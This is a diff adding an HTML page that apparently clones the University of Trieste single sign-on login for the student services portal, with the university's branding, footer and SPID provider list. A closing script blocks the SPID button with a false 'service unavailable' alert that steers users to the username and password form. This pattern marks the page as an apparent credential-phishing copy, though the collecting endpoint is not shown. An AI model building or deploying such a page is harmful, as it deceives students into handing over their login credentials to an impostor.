@@ -1,0 +1,156 @@
+
+<!DOCTYPE html><html lang="en"><head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0">
+        <title>University of Trieste - Stale Request</title>
+        <link rel="stylesheet" type="text/css" href="css/main.css">
+     <link rel="shortcut icon" href="favicon.ico" type="image/vnd.microsoft.icon">
+    </head>
+
+    <body>
+    <div class="wrapper">
+    	  <header>
+          <img src="images/Logo.png" alt="University Logo">
+        </header>
+      <div class="container">
+
+
+        <div class="content">
+				<div class="row"> <h1>Welcome</h1></div>
+					<div class="row1">
+          <p>WELCOME, The University of Trieste has implemented authentication with SPID (Public System for Digital Identity) credentials for access to the reserved area of student secretarial services.</p>
+          <p>As an alternative to SPID credentials, you can continue to use the university credentials you already own.</p>
+          </div>
+          <div class="column one">
+              <p>Sign in to the service <b>sp-esse3-units-prod.cineca.it</b></p>
+
+
+
+
+
+            <form action="/idp/profile/SAML2/Redirect/SSO?execution=e1s2" method="post">
+
+
+
+              <div class="form-element-wrapper">
+                <label for="username">Username</label>
+                <input class="form-element form-field" id="username" name="j_username" type="text" placeholder="" value="">
+              </div>
+
+              <div class="form-element-wrapper">
+                <label for="password">Password</label>
+                <input class="form-element form-field" id="password" name="j_password" type="password" value="">
+              </div>
+
+              <!--<div class="form-element-wrapper">
+                <input type="checkbox" name="donotcache" value="1" id="donotcache">
+                <label for="donotcache">Don't Remember Login</label>
+               </div>-->
+
+              <!--<div class="form-element-wrapper">
+                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
+                <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label>
+              </div>-->
+
+              <div class="form-element-wrapper">
+                <button class="form-element form-button" type="submit" name="_eventId_proceed" onclick="this.childNodes[0].nodeValue='Logging in, please wait...'">Login</button>
+              </div>
+
+
+			<!-- AGID - SPID IDP BUTTON SMALL "ENTRA CON SPID" * begin * -->
+
+			<a class="italia-it-button italia-it-button-size-m button-spid" spid-idp-button="#spid-idp-button-small-get" aria-haspopup="true" aria-expanded="false">
+				<span class="italia-it-button-icon"><img src="images/spid-ico-circle-bb.svg" onerror="this.src='/idp/spid/button-img/spid-ico-circle-bb.png'; this.onerror=null;" alt=""></span>
+				<span class="italia-it-button-text">Entra con SPID</span>
+			</a>
+			<button type="submit" id="bt_spid" name="_eventId_authn/CookieAuth" style="display:none;"></button>
+			<input type="hidden" value="" id="spid_idp" name="spid_idp">
+			<div id="spid-idp-button-small-get" class="spid-idp-button spid-idp-button-tip spid-idp-button-relative">
+				<ul id="spid-idp-list-small-root-get" class="spid-idp-button-menu" aria-labelledby="spid-idp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+				<li class="spid-idp-button-link" data-idp="infocamereid">
+              <a onclick="triggerButton(12);"><span class="spid-sr-only">InfoCamere ID</span>
+              <img src="/idp/spid/button-img/spid-idp-infocamereid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-infocamereid.png'; this.onerror=null;" alt="InfoCamere ID"></a>
+            </li><li class="spid-idp-button-link" data-idp="timid">
+                <a onclick="triggerButton(3);"><span class="spid-sr-only">Tim ID</span><img class="spid-idp-button-logo" src="/idp/spid/button-img/spid-idp-timid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-timid.png'; this.onerror=null;" alt="Tim ID"></a>
+            </li><li class="spid-idp-button-link" data-idp="lepidaid">
+ 								<a onclick="triggerButton(9);"><span class="spid-sr-only">Lepida ID</span>
+ 								<img src="/idp/spid/button-img/spid-idp-lepidaid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-lepidaid.png'; this.onerror=null;" alt="Lepida ID"></a>
+ 						</li><li class="spid-idp-button-link" data-idp="infocertid">
+                <a onclick="triggerButton(1);"><span class="spid-sr-only">Infocert ID</span><img class="spid-idp-button-logo" src="/idp/spid/button-img/spid-idp-infocertid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-infocertid.png'; this.onerror=null;" alt="Infocert ID"></a>
+            </li><li class="spid-idp-button-link" data-idp="spiditalia">
+                <a onclick="triggerButton(7);"><span class="spid-sr-only">SPIDItalia Register.it</span><img class="spid-idp-button-logo" src="/idp/spid/button-img/spid-idp-spiditalia.svg" onerror="this.src='/idp/spid/button-img/spid-idp-spiditalia.png'; this.onerror=null;" alt="SpidItalia"></a>
+            </li><li class="spid-idp-button-link" data-idp="posteid">
+                <a onclick="triggerButton(2);"><span class="spid-sr-only">Poste ID</span><img class="spid-idp-button-logo" src="/idp/spid/button-img/spid-idp-posteid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-posteid.png'; this.onerror=null;" alt="Poste ID"></a>
+            </li><li class="spid-idp-button-link" data-idp="intesigroup">
+              <a onclick="triggerButton(13);"><span class="spid-sr-only">Intesi Group ID</span>
+              <img src="/idp/spid/button-img/spid-idp-intesigroupspid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-intesigroupspid.png'; this.onerror=null;" alt="Intesi Group ID"></a>
+            </li><li class="spid-idp-button-link" data-idp="teamsystemid">
+              <a onclick="triggerButton(10);"><span class="spid-sr-only">TeamSystem ID</span>
+              <img src="/idp/spid/button-img/spid-idp-teamsystemid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-teamsystemid.png'; this.onerror=null;" alt="TeamSystem ID"></a>
+            </li><li class="spid-idp-button-link" data-idp="etnaid">
+              <a onclick="triggerButton(11);"><span class="spid-sr-only">Etna ID</span>
+              <img src="/idp/spid/button-img/spid-idp-etnaid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-etnaid.png'; this.onerror=null;" alt="Etna ID"></a>
+            </li><li class="spid-idp-button-link" data-idp="namirialid">
+                <a onclick="triggerButton(6);"><span class="spid-sr-only">Namirial ID</span><img class="spid-idp-button-logo" src="/idp/spid/button-img/spid-idp-namirialid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-namirialid.png'; this.onerror=null;" alt="Namirial ID"></a>
+            </li><li class="spid-idp-button-link" data-idp="arubaid">
+                <a onclick="triggerButton(5);"><span class="spid-sr-only">Aruba ID</span>
+                <img class="spid-idp-button-logo" src="/idp/spid/button-img/spid-idp-arubaid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-arubaid.png'; this.onerror=null;" alt="Aruba ID"></a>
+            </li><li class="spid-idp-button-link" data-idp="sielteid">
+                <a onclick="triggerButton(4);"><span class="spid-sr-only">Sielte ID</span><img class="spid-idp-button-logo" src="/idp/spid/button-img/spid-idp-sielteid.svg" onerror="this.src='/idp/spid/button-img/spid-idp-sielteid.png'; this.onerror=null;" alt="Sielte ID"></a>
+            </li><li class="spid-idp-support-link">
+                <a href="https://www.spid.gov.it">Maggiori informazioni</a>
+            </li><li class="spid-idp-support-link">
+                <a href="https://www.spid.gov.it/richiedi-spid">Non hai SPID?</a>
+            </li><li class="spid-idp-support-link">
+                <a href="https://www.spid.gov.it/serve-aiuto">Serve aiuto?</a>
+            </li></ul>
+			</div>
+
+
+            </form>
+
+
+
+          </div>
+          <div class="column two">
+            <ul class="list list-help">
+                <li class="list-help-item"><a href="https://www.units.it/credenziali"><span class="item-marker">›</span> Password recovery</a></li>
+                <li class="list-help-item"><a href="https://esse3.units.it/Guide/Home.do"><span class="item-marker">›</span> Online guide</a></li>
+              <!--<li class="list-help-item"><a href="#"><span class="item-marker">&rsaquo;</span> Need Help?</a></li>-->
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <footer>
+        <div class="container-footer">
+          <p class="footer-text">Piazzale Europa, 1 - 34127 - Trieste, Italia - Tel. +39 040 558 7111 - P.IVA 00211830328 - C.F. 80013890324 - P.E.C. ateneo@pec.units.it<br><a class="footer-links" title="Privacy" target="_blank" href="https://www.units.it/en/privacy-policy" style="color: #fff;">Privacy policy</a><br><a class="footer-links" title="Cookie policy" target="_blank" href="/idp/cookieLaw.jsp" style="color: #fff;">Cookie policy</a></p>
+        </div>
+      </footer>
+    </div>
+
+
+<script>
+document.querySelector(".italia-it-button-text").addEventListener("click", function() {
+    alert("Servizio SPID non disponibile, per favore inserire le credenziali d'accesso");
+});
+</script>
+
+
+
+</body></html>
